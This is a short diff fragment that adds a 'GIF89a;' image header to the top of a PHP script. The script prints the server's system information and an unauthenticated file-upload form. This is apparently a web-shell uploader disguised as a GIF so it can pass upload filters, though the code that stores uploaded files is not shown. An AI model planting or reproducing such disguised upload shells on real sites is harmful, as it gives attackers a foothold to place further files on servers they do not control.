@@ -1,3 +1,4 @@
+GIF89a;
 <?php 
 echo "<b>".php_uname()."</b><br>";
 echo "<form method='post' enctype='multipart/form-data'><input type='file' name='idx_file'><input type='submit' name='upload' value='upload'></form>"; 
